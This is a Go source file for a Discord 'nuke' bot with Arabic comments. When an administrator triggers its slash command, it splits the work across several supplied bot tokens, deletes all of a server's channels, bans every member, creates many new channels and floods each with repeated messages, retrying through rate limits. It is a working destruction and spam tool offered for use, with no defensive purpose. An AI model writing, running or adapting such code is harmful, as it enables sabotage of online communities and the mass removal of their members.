package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 10000,
		IdleConnTimeout:     60 * time.Second,
	},
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdNuke := "nuke"
	commandNuke := &discordgo.ApplicationCommand{
		Name:        cmdNuke,
		Description: "أمر التجربة بالسرعات المخصصة والراحة المحددة للأعضاء",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة التي ستُرسل",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "التوكنات مفصولة بفاصلة (,) لتوزيع المهام بينها",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ هذا الأمر للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		if i.ApplicationCommandData().Name == cmdNuke {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "⚡ جاري تنفيذ العمليات بالسرعات والراحة المحددة...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			tokensInput := optionMap["bot_tokens"].StringValue()
			
			rawTokens := strings.Split(tokensInput, ",")
			var tokens []string
			for _, t := range rawTokens {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			guildID := i.GuildID
			botID := s.State.User.ID

			go executeDistributedNuke(tokens, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
	fmt.Println("🤖 بوت السرعات المخصصة شغال وجاهز!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDistributedNuke(tokens []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
	if len(tokens) == 0 {
		fmt.Println("❌ خطأ: لم يتم إدخال أي توكن صحيح.")
		return
	}

	getHeaders := func(index int) map[string]string {
		token := tokens[index%len(tokens)]
		return map[string]string{
			"Authorization": "Bot " + token,
			"Content-Type":  "application/json",
			"User-Agent":    "DiscordBot (https://discord.com, v10)",
		}
	}

	// 1. تجهيز بايلودات الرومات مسبقاً
	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	// 2. تجهيز بايلود الرسائل
	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	// 3. سحب الأعضاء
	var allUserIDs []string
	after := ""
	for {
		members, err := s.GuildMembers(guildID, after, 1000)
		if err != nil || len(members) == 0 {
			break
		}
		for _, m := range members {
			if m != nil && m.User != nil {
				if m.User.ID != botID {
					allUserIDs = append(allUserIDs, m.User.ID)
				}
				after = m.User.ID
			}
		}
		if len(members) < 1000 {
			break
		}
	}

	// 4. جلب القنوات القديمة
	channels, err := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if err == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	time.Sleep(1 * time.Second)

	// أ. حذف الرومات القديمة (20 جزء من الثانية بين كل روم)
	var wgDel sync.WaitGroup
	for idx, id := range oldChannelIDs {
		wgDel.Add(1)
		go func(chID string, index int) {
			defer wgDel.Done()
			headers := getHeaders(index)
			delURL := "https://discord.com/api/v10/channels/" + chID
			for {
				delReq, _ := http.NewRequest("DELETE", delURL, nil)
				for k, v := range headers {
					delReq.Header.Set(k, v)
				}

				resp, err := httpClient.Do(delReq)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(50 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
				break
			}
		}(id, idx)
		time.Sleep(20 * time.Millisecond)
	}
	wgDel.Wait()

	// ب. حظر الأعضاء (مع راحة 100 ميلي ثانية لكل 1000 عضو)
	var wgBan sync.WaitGroup
	for idx, userID := range allUserIDs {
		wgBan.Add(1)
		go func(uid string, index int) {
			defer wgBan.Done()
			headers := getHeaders(index)
			banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
			for {
				banReq, _ := http.NewRequest("PUT", banURL, nil)
				for k, v := range headers {
					banReq.Header.Set(k, v)
				}

				resp, err := httpClient.Do(banReq)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(50 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
				break
			}
		}(userID, idx)

		// تطبيق الراحة (100 ميلي ثانية) لكل 1000 عضو يتم معالجتهم
		if (idx+1)%1000 == 0 {
			time.Sleep(100 * time.Millisecond)
		}
	}
	wgBan.Wait()

	// ج. إنشاء الرومات الجديدة (20 جزء من الثانية بين كل روم)
	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	for idx, payload := range channelPayloads {
		wgCreate.Add(1)
		go func(p []byte, index int) {
			defer wgCreate.Done()
			headers := getHeaders(index)
			for {
				reqCreate, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				for k, v := range headers {
					reqCreate.Header.Set(k, v)
				}

				resp, err := httpClient.Do(reqCreate)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(50 * time.Millisecond)
					}
					continue
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
						if chID, ok := chResult["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, chID)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
				break
			}
		}(payload, idx)
		time.Sleep(20 * time.Millisecond)
	}
	wgCreate.Wait()

	// د. إرسال الرسائل (10 أجزاء من الثانية بين كل رسالة)
	var wgMsg sync.WaitGroup
	for idx, chID := range newChannelIDs {
		wgMsg.Add(1)
		go func(chIDParam string, index int) {
			defer wgMsg.Done()
			headers := getHeaders(index)
			
			for m := 0; m < messagesCount; m++ {
				for {
					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
					for k, v := range headers {
						msgReq.Header.Set(k, v)
					}

					msgResp, err := httpClient.Do(msgReq)
					if err != nil {
						return
					}

					if msgResp.StatusCode == 429 {
						retryAfterStr := msgResp.Header.Get("Retry-After")
						msgResp.Body.Close()
						if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
							time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
						} else {
							time.Sleep(50 * time.Millisecond)
						}
						continue
					}
					msgResp.Body.Close()
					break
				}
				time.Sleep(10 * time.Millisecond)
			}
		}(chID, idx)
	}
	wgMsg.Wait()

	fmt.Println("✅ انتهت كافة العمليات بالسرعات والراحة المحددة بنجاح!")
}
